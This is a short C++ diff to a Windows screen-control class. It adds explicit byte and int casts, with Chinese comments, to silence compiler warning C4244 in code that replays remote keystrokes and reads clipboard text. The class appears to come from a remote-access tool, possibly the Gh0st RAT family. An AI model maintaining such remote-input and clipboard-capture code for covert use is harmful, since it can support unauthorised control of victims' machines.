@@ -304,11 +304,15 @@ void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
 				break;
 			case WM_KEYDOWN:
 			case WM_SYSKEYDOWN:
-				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
+				//pMsg->wParam 是虚拟键码，MapVirtualKey 返回的是扫描码，二者都落在一个字节范围内，
+				//传给 keybd_event 前做显式收窄转换是安全的，用于消除 C4244 告警。
+				keybd_event(static_cast<BYTE>(pMsg->wParam), static_cast<BYTE>(MapVirtualKey(static_cast<UINT>(pMsg->wParam), 0)), 0, 0);
 				break;	
 			case WM_KEYUP:
 			case WM_SYSKEYUP:
-				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
+				//pMsg->wParam 是虚拟键码，MapVirtualKey 返回的是扫描码，二者都落在一个字节范围内，
+				//传给 keybd_event 前做显式收窄转换是安全的，用于消除 C4244 告警。
+				keybd_event(static_cast<BYTE>(pMsg->wParam), static_cast<BYTE>(MapVirtualKey(static_cast<UINT>(pMsg->wParam), 0)), KEYEVENTF_KEYUP, 0);
 				break;
 			default:
 				break;
@@ -344,7 +348,8 @@ void CScreenManager::SendLocalClipboard()
 		::CloseClipboard();
 		return;
 	}
-	int	nPacketLen = GlobalSize(hglb) + 1;
+	//剪贴板文本长度不会超过 int 的表示范围，这里对 GlobalSize 返回的 SIZE_T 显式收窄以消除 C4244 告警。
+	int	nPacketLen = static_cast<int>(GlobalSize(hglb)) + 1;
 	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
 	LPBYTE	lpData = new BYTE[nPacketLen];
 	//lpData[0] = TOKEN_CLIPBOARD_TEXT;
